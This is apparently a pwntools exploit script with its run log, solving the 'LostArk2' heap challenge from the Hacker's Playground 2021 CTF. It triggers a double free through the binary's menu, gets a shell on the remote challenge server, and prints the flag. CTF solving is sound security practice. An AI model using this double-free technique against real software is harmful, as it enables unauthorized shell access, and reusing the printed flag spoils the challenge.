from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './patch'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "lostark2.sstf.site"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
  s = process(BINARY, env={'LD_PRELOAD': './libc.so.6'})

def Create(mode, name):
  s.sendlineafter("pick: ", "1")
  s.sendlineafter("pick: ", str(mode))
  if mode != 7:
    s.sendlineafter("name: ", name)

def Delete(idx):
  s.sendlineafter("pick: ", "2")
  s.sendlineafter("pick: ", str(idx))

def List():
  s.sendlineafter("pick: ", "3")

def Choose(idx):
  s.sendlineafter("pick: ", "4")
  s.sendlineafter("pick: ", str(idx))

def Set_skill():
  s.sendlineafter("pick: ", "5")

def Use_skill():
  s.sendlineafter("pick: ", "6")

Create(7, "")
Delete(0)

Create(1, "A"*4)
Choose(0)

Create(7, "")
Choose(1)

# Double free
Create(1, "B"*4)
Delete(0)
Delete(1)

Create(1, "C"*4)

Create(7, "")
Choose(0)

Use_skill()

s.interactive()

'''
mito@ubuntu:~/CTF/Hacker's_Playground_2021/Pwn_LostArk2$ python solve.py r
[*] "/home/mito/CTF/Hacker's_Playground_2021/Pwn_LostArk2/patch"
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to lostark2.sstf.site on port 1337: Done
[*] Switching to interactive mode

= use skill =
$ id
uid=1000(lostark) gid=1000(lostark) groups=1000(lostark)
$ ls -l
total 72
drwxr-xr-x   2 root root    4096 Jul 23 13:50 bin
drwxr-xr-x   2 root root    4096 Apr 24  2018 boot
drwxr-xr-x   5 root root     340 Aug 15 06:09 dev
drwxr-xr-x   1 root root    4096 Aug 15 06:09 etc
-r--r-----   1 root lostark   24 Aug  6 01:30 flag
drwxr-xr-x   1 root root    4096 Aug 15 06:09 home
drwxr-xr-x   1 root root    4096 May 23  2017 lib
drwxr-xr-x   2 root root    4096 Jul 23 13:50 lib64
drwxr-xr-x   2 root root    4096 Jul 23 13:49 media
drwxr-xr-x   2 root root    4096 Jul 23 13:49 mnt
drwxr-xr-x   2 root root    4096 Jul 23 13:49 opt
dr-xr-xr-x 192 root root       0 Aug 15 06:09 proc
drwx------   2 root root    4096 Jul 23 13:50 root
drwxr-xr-x   5 root root    4096 Jul 23 13:50 run
drwxr-xr-x   2 root root    4096 Jul 23 13:50 sbin
drwxr-xr-x   2 root root    4096 Jul 23 13:49 srv
-rwxrwxr-x   1 root root      53 Aug  6 01:30 start.sh
dr-xr-xr-x  13 root root       0 Aug 15 06:09 sys
drwxrwxrwt   1 root root    4096 Aug 15 06:09 tmp
drwxr-xr-x   1 root root    4096 Jul 23 13:49 usr
drwxr-xr-x   1 root root    4096 Jul 23 13:50 var
$ cat flag
SCTF{KUKURUPPINGPPONG!}
'''

